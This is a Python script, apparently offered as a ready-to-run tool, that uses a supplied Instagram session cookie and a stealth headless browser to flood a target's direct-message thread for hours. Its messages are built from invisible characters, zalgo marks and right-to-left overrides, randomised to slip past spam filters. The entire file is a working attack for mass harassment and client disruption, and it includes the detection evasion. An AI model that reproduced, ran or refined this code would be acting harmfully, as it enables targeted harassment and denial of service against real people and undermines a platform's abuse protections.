# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER NC (IMPACT EDITION)
# 📅 STATUS: MULTI-PHASE BYPASS | 2 THREADS | 120s RESTART

import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium_stealth import stealth
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options

# --- V100 IMPACT CONFIG ---
THREADS = 2             
TOTAL_DURATION = 21600  
BURST_SPEED = (0.08, 0.2) # Balanced for impact vs filter
SESSION_LIMIT = 120     

GLOBAL_SENT = 0
COUNTER_LOCK = threading.Lock()

# --- THE 4-PHASE PAYLOAD GENERATOR ---
def get_impact_payload(target):
    # Phase 1: Invisible DOM Bloat
    bloat = "".join(random.choice(["‎", "‏", "‌", "‍"]) for _ in range(random.randint(500, 1000)))
    
    # Phase 2: Zalgo "Bleed"
    zalgo_marks = ["̸", "̸", "̸", "̸", "̸"]
    glitch_text = "".join(c + "".join(random.sample(zalgo_marks, 3)) for c in "PRAVEER")
    
    # Phase 3: RTL Confusion (Flips the text direction in memory)
    rtl_trigger = "\u202E" 
    
    # Phase 4: Randomizing the structure to bypass filters
    modes = [
        f"({target}) {bloat} {glitch_text} 🛑", # Bloat Heavy
        f"⚠️ {glitch_text} {rtl_trigger} ⚠️ {bloat}", # RTL/Glitch mix
        f"🛑 {bloat} \n{glitch_text}\n {target}", # Vertical/Bloat mix
        f"{glitch_text} " * 5 + f"{bloat}" # Pure Glitch Spam
    ]
    return random.choice(modes)

def get_driver(agent_id):
    chrome_options = Options()
    chrome_options.add_argument("--headless=new") 
    chrome_options.add_argument("--no-sandbox") 
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    
    # iPhone X Emulation (Best for GH Runners)
    mobile_emulation = {
        "deviceMetrics": { "width": 375, "height": 812, "pixelRatio": 3.0 },
        "userAgent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
    }
    chrome_options.add_experimental_option("mobileEmulation", mobile_emulation)
    
    temp_dir = os.path.join(tempfile.gettempdir(), f"v100_imp_{agent_id}_{int(time.time())}")
    chrome_options.add_argument(f"--user-data-dir={temp_dir}")

    driver = webdriver.Chrome(options=chrome_options)
    stealth(driver, languages=["en-US"], vendor="Google Inc.", platform="iPhone", webgl_vendor="Apple", renderer="Apple GPU", fix_hairline=True)
    driver.custom_temp_path = temp_dir
    return driver

def adaptive_inject(driver, text):
    try:
        # Targeting the Instagram "Message..." placeholder/textbox
        box = driver.find_element(By.XPATH, "//div[@role='textbox']")
        driver.execute_script("arguments[0].click();", box)
        driver.execute_script("document.execCommand('insertText', false, arguments[0]);", text)
        time.sleep(0.05)
        box.send_keys(Keys.ENTER)
        return True
    except:
        return False

def run_life_cycle(agent_id, cookie, target):
    global GLOBAL_SENT
    start_time = time.time()

    while (time.time() - start_time) < TOTAL_DURATION:
        driver = None
        temp_path = None
        session_start = time.time()
        
        try:
            driver = get_driver(agent_id)
            temp_path = getattr(driver, 'custom_temp_path', None)
            
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
            driver.refresh()
            time.sleep(7)
            
            driver.get(f"https://www.instagram.com/direct/t/{target}/")
            time.sleep(7)

            while (time.time() - session_start) < SESSION_LIMIT:
                payload = get_impact_payload(os.getenv("TARGET_NAME", "User"))
                if adaptive_inject(driver, payload):
                    with COUNTER_LOCK:
                        GLOBAL_SENT += 1
                        if GLOBAL_SENT % 5 == 0:
                            print(f"[#] {GLOBAL_SENT} IMPACTS DELIVERED | SCRIPT BY PRAVEER", flush=True)
                time.sleep(random.uniform(*BURST_SPEED))

        except Exception as e:
            print(f"Agent {agent_id} stalled: {str(e)[:30]}")
        finally:
            if driver: driver.quit()
            if temp_path and os.path.exists(temp_path): shutil.rmtree(temp_path, ignore_errors=True)
            gc.collect()
            time.sleep(5)

def main():
    cookie = os.environ.get("SESSION_ID", "").strip()
    raw_url = os.environ.get("GROUP_URL", "").strip()
    target_id = raw_url.split('/')[-2] if '/' in raw_url else raw_url
    
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for i in range(THREADS):
            executor.submit(run_life_cycle, i+1, cookie, target_id)

if __name__ == "__main__":
    main()
